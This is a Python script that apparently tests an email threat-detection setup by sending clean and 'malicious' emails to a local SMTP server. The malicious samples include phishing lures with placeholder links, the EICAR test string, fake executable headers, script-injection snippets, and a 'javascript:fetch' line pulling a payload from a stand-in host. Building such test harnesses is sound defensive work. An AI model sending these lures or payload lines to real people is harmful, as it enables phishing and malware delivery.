#!/usr/bin/env python3

import smtplib
import os
import random
import time
from email.message import EmailMessage

# ───── Configuration ──────────────────────────────────────────────────────────
SMTP_HOST = "127.0.0.1"
SMTP_PORT = 25
TO_ADDR   = "recipient@email-threat-docker.local"

# Pool of possible senders (from your clean_emails list)
SENDER_POOL = [
    "notifications@company.com",
    "newsletter@store.com",
    "hr@company.com",
    "teamlead@company.com",
    "noreply@itdept.company.com",
    "alerts@service.com",
    "events@company.com",
    "security@service.com",
    "devteam@company.com",
    "communications@company.com",
    "billing@legit-company.com",
    "deals@newsletter.com",
    "security@onlinebank.com",
    "support@service.com",
    "info@company.com",
    "admin@company.com",
    "notifications@company.com",
    "support@apple.com",
    "support@bank.com",
    "support@onlineservice.com",
    "rewards@shopping.com",
    "security@bigcorp.com",
]

# create a fake PE binary for one of the attachments
fake_pe = b"MZ" + b"\x00" * (0x3C - 2) + b"PE\x00\x00" + os.urandom(1000)

# ───── Email Definitions ──────────────────────────────────────────────────────

clean_emails = [
     ("Upcoming Holiday Schedule", """Dear Team, Please note that the company will be closed on Monday for the public holiday. Regular work resumes on Tuesday at 9 AM. Enjoy your long weekend! Best,
    HR Department """, None),
    ("Project Kickoff Meeting", """Hi Everyone, You are invited to the project kickoff meeting this Friday at 2 PM in Conference Room A. Please see the calendar invite and let me know if you have any questions.
    Thanks, Team Lead""", None),
    ("Scheduled Maintenance Tonight", """Dear User, This is to inform you that there will be a brief network outage tonight from 11 PM to midnight due to scheduled maintenance. No action is required on your part.
    IT Department """, None),
    ("Your Subscription Renewal Confirmation", """Hi, Your subscription has been successfully renewed. The payment of $49.99 has been processed. Thank you for choosing our service! Regards, Billing Team""",
    None),
    ("Join Us for the Charity Run!","""Hello, You are invited to participate in our annual charity run this weekend. Visit our website for details and registration. We look forward to seeing you there! Cheers, Community Outreach Team
    """, None),
    ("Password Change Successful", """Hello,This is a confirmation that your account password was successfully changed. If you did not make this change, please contact our support team immediately.
    Thank you, Security Team """, None),
    ("Feature X Deployment", """Team, Feature X has been deployed to the production environment. All tests passed, and performance is stable. Please report any issues to the development channel.
    Thanks,Dev Team """,None),
    ("Town Hall Meeting Next Week","""Dear Colleagues, We will be holding a company-wide town hall meeting next Wednesday at 10 AM via video conference. An invite with dial-in details will follow soon.
    Best regards, Communications """, None),
    ("Team Lunch", "Who's up for pizza on Friday?", None),
    ("Project Update", "The Q2 deliverables are attached", {"report.pdf": b"PDF: Project milestones..."}),
    ("Meeting Reminder", "Don't forget our 2pm meeting!", None),
    ("Network Maintenance", "Scheduled downtime tonight 11PM-1AM", None),
    ("New Policy Document", "Please review attached handbook", {"handbook.docx": b"DOCX: Company policies..."}),
    ("Welcome New Hire", "Please welcome Alice to the team!", None),
    ("Office Closure", "HQ will be closed for Memorial Day", None),
    ("Benefits Update", "New healthcare options available", None),
    ("Password Policy Reminder", "Remember to change passwords quarterly", None),
    ("Conference Registration", "Industry summit registration open", None),
]

malicious_emails = [
    ("Urgent: Invoice Payment Required", """Hello, Your invoice is overdue. Click here to view and pay: http://phishingsite.example.com/invoice?id=12345
    Thank you.""", None),
    ("Hot Deals This Weekend!", """Hi, Don't miss out on exclusive offers at spamdomain.net! Visit our site: http://spamdomain.net/sale Cheers.""", None),
    ("Account Locked", """Dear user, We detected suspicious activity. Please click here to unlock your account: http://fakebank.example.com/verify Regards.""", None),
    ("Password Reset Required", """Hello, Your password must be reset due to a security issue. Click here to reset your password immediately: http://service.example.com/reset-password Thanks.""", None),
    ("Important Document", """Hello, See the attached invoice.exe for details on your recent purchase. It's an urgent matter.""", None),
    ("Monthly Report","""Attached is the report. The attachment contains the antivirus test string: X5O!P%@AP[4PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* Please check it.""", None),
    ("System Notification", """Hello, Please visit http://example.com/%68%61%63%6b%65%64 where you'll find important information.""", None),
    ("Final Warning", """Dear customer, This is your final warning to update your payment information. Visit our secure portal here: http://secure-update.example.com/account""", None),
    ("Mandatory W-2 Form", """Hello, Please click here to fill out your W-2 tax form: http://legit-bank.info/w2form """, None),
    ("Account Verification Needed", """Dear User, Your Apple ID has unusual activity. Click here to sign in and secure your account: http://malicious-verify.example.com/login""", None),
    ("Password Reset Request", """Hello, We received a request to reset your password. Click here to reset it: http://bank.example.com/reset""", None),
    ("Mandatory Company Survey", """Hello, Please click here to complete the employee satisfaction survey: http://survey.example.com/""", None),
    ("Suspicious Login Attempt", """We’ve noticed a login from a new device. Click here to review the activity: http://alert.example.com/review """, None),
    ("Account Compromised", """Your account was compromised. Reset your password immediately: http://bigcorp.example.com/reset """, None),
    ("You've Won a $100 Gift Card!", """Congratulations! Claim your $100 gift card by clicking here: http://freegift.example.com/claim""", None),
    ("Quick Employee Survey", """Hello, Click here to provide feedback and win a prize: http://survey.example.com/""", None),
    ("URGENT: Security Alert", "Scan attached file immediately!",
     {"eicar.com": b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"}),
    ("Invoice #INV-9876", "Please review payment details",
     {"invoice.exe": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"PE\x00\x00" + os.urandom(1000)}),
    ("Account Verification Needed", "Click here: http://malicious.link/verify?user=<script>stealCreds()</script>", None),
    ("Document Shared", """<html><body><script>malware.download()</script>View document</body></html>""",
     None, "html"),
    ("Encrypted Report", "Password: infected",
     {"data.bin": os.urandom(1024)}),
    ("Password Reset Required", "Immediate action required: http://phishing-site.com/reset", None),
    ("Your Package Tracking", "javascript:fetch('http://malware-download.com/payload')", None),
    ("Financial Report", "See attached analysis",
     {"report.zip": b"\x50\x4B\x03\x04FakeZIP"}),  # ZIP header match
    ("Microsoft Security Update", "Critical patch - apply immediately",
     {"update.msi": fake_pe}),
    ("Undelivered Mail Notification", """<img src="http://tracker.com/pixel.gif">""",
     {"details.eml": b"From: <spoofed@ceo.com>\nSubject: Wire transfer\n"})

]


# ───── Build Combined List ────────────────────────────────────────────────────
all_tests = []

def normalize_entry(entry, tag):
    """
    Given a tuple entry of length 3 or 4, return a dict:
    { subject, body, attachment, content_type, type }
    """
    if len(entry) == 3:
        subj, body, attach = entry
        ctype = "plain"
    elif len(entry) == 4:
        subj, body, attach, ctype = entry
    else:
        raise ValueError(f"Entry has wrong length ({len(entry)}): {entry!r}")
    return {
        "subject":      subj,
        "body":         body,
        "attachment":   attach,
        "content_type": ctype,
        "type":         tag
    }

# Add clean emails
for e in clean_emails:
    all_tests.append(normalize_entry(e, "#"))

# Add malicious emails
for e in malicious_emails:
    all_tests.append(normalize_entry(e, "#"))

# ───── Email Sending Function ────────────────────────────────────────────────
def send_email(subject, body, attachment=None, content_type="plain"):
    msg = EmailMessage()
    msg["From"]    = random.choice(SENDER_POOL)
    msg["To"]      = TO_ADDR
    msg["Subject"] = subject

    if content_type == "html":
        msg.add_alternative(body, subtype="html")
    else:
        msg.set_content(body)

    if attachment:
        for fname, data in attachment.items():
            msg.add_attachment(
                data,
                maintype="application",
                subtype="octet-stream",
                filename=fname
            )

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as smtp:
        smtp.send_message(msg)

# ───── Main Loop ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    total = len(all_tests)
    print(f"Sending {total} test emails to {TO_ADDR}\n")

    for idx, mail in enumerate(all_tests, 1):
        try:
            send_email(
                mail["subject"],
                mail["body"],
                mail["attachment"],
                mail["content_type"]
            )
            status = "✔ Delivered"
        except Exception as e:
            status = f"✗ Failed ({e})"

        print(f"[{mail['type']}] {mail['subject']} → {status}")
        time.sleep(0.2)
